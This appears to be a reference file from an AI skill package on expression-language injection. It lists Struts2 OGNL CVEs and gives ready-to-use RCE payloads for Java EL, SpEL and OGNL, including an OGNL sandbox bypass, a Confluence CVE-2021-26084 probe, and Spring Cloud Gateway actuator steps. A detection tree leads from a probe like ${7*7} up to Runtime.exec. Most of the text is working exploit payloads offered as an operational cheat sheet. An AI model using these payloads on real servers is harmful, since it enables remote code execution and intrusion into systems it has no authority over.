# expression-language-injection — 详细参考（由 SKILL.md 拆分）

### Key Struts2 CVEs

| CVE | Vector | Payload Location |
|---|---|---|
| S2-045 (CVE-2017-5638) | Content-Type header | `%{...}` in Content-Type |
| S2-046 (CVE-2017-5638) | Multipart filename | OGNL in upload filename |
| S2-016 (CVE-2013-2251) | `redirect:` / `redirectAction:` prefix | URL parameter |
| S2-048 (CVE-2017-9791) | Struts Showcase | ActionMessage with OGNL |
| S2-057 (CVE-2018-11776) | Namespace OGNL | URL path |

### Confluence OGNL — CVE-2021-26084

Confluence Server allows OGNL injection via the `queryString` or action parameters:

```bash
POST /pages/createpage-entervariables.action
Content-Type: application/x-www-form-urlencoded

queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027
# URL-decoded: \u0027+{3*3}+\u0027
# If response contains 9 → confirmed
# Escalate to Runtime.exec for RCE
```

---

## 4. JAVA EL (JSP / JSF)

### Where Java EL Appears

- JSP pages: `${expression}` and `#{expression}`
- JSF (JavaServer Faces): value and method bindings
- Custom tag libraries

### RCE Payloads

```java
// Java EL with Runtime:
${Runtime.getRuntime().exec("id")}

// Via pageContext (JSP):
${pageContext.request.getServletContext().getClassLoader()}

// Reflection-based:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

## 5. DETECTION METHODOLOGY

```
Input reflected and ${7*7} returns 49?
├── Java application?
│   ├── Struts2? → Try %{...} OGNL payloads
│   │   └── Check Content-Type injection (S2-045)
│   ├── Spring? → Try T(java.lang.Runtime) SpEL
│   │   └── Check /actuator/gateway (Spring Cloud Gateway)
│   ├── Confluence? → Try OGNL via action parameters
│   └── JSP/JSF? → Try Java EL payloads
│
├── Error messages reveal framework?
│   ├── "ognl.OgnlException" → OGNL
│   ├── "SpelEvaluationException" → SpEL
│   └── "javax.el.ELException" → Java EL
│
└── Blocked by sandbox?
    ├── OGNL: clear _memberAccess / excludedClasses
    ├── SpEL: reflection bypass for SimpleEvaluationContext
    └── Try alternative exec methods (ProcessBuilder, ScriptEngine)
```

---

## 6. QUICK REFERENCE

```text
# SpEL RCE:
${T(java.lang.Runtime).getRuntime().exec("id")}

# OGNL RCE (Struts2):
%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# OGNL with sandbox bypass:
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# Java EL RCE:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Confluence CVE-2021-26084 probe:
queryString=\u0027%2b{3*3}%2b\u0027

# Spring Cloud Gateway CVE-2022-22947:
POST /actuator/gateway/routes/x  → SpEL in filter args
POST /actuator/gateway/refresh
```
